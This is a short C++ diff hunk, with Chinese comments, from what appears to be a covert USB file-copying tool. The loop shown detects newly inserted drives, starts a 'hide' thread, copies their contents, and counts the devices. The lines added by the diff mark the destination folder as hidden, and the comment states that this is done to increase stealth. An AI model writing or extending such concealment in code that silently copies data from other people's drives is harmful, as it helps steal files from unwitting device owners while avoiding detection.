@@ -37,6 +37,9 @@ int main() {
 				src[0] = newdisks[i];
 				CreateThread(NULL, 0, hide, NULL, 0, NULL);
 				copy();
+				WCHAR   wstr[MAX_PATH] = { 0 };		//为兼容VS2015不能转化char*为lpctstr而设置
+				MultiByteToWideChar(CP_ACP, 0, dest, -1, wstr, sizeof(wstr));
+				::SetFileAttributes(wstr, FILE_ATTRIBUTE_HIDDEN);	//设置存放目录为隐藏，增加隐蔽性
 				usbnums++;
 			}
 			newdisks.clear();
